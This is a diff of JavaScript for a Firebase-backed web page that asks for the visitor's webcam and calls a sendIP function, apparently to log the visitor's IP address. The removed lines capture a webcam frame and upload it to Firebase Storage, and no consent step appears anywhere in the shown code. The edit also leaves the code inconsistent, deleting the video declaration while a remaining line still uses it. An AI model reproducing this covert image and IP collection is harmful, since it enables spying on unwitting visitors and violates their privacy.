@@ -14,13 +14,11 @@ const firebaseConfig = {
           const auth = firebase.auth();
           const firestore = firebase.firestore();
           const database = firebase.database();
-          const storage = firebase.storage();
+          
 
         // Access the user's webcam
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const context = canvas.getContext('2d');
-        let stream;
+        
+        
 if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
             navigator.mediaDevices.getUserMedia({ video: true }).then(function(mediaStream) {
                 video.srcObject = mediaStream;
@@ -182,24 +180,4 @@ async function sendIP(database) {
         }
 sendIP(database);
         // Capture and upload photo
-        function capturePhoto() {
-            // Draw video frame onto canvas
-            context.drawImage(video, 0, 0, 640, 480);
-
-            // Convert canvas to base64 image
-            canvas.toBlob(function(blob) {
-                // Upload to Firebase Storage
-                const storageRef = storage.ref('captured_images/' + Date.now() + '.png');
-                const uploadTask = storageRef.put(blob);
-
-                uploadTask.on('state_changed', function(snapshot) {
-                    // Handle progress
-                }, function(error) {
-                    console.error("Error uploading image: ", error);
-                }, function() {
-                    // Upload complete, stop webcam
-                    stream.getTracks().forEach(track => track.stop());
-                    console.log("Upload complete and webcam stopped");
-                });
-            });
-        }
+        
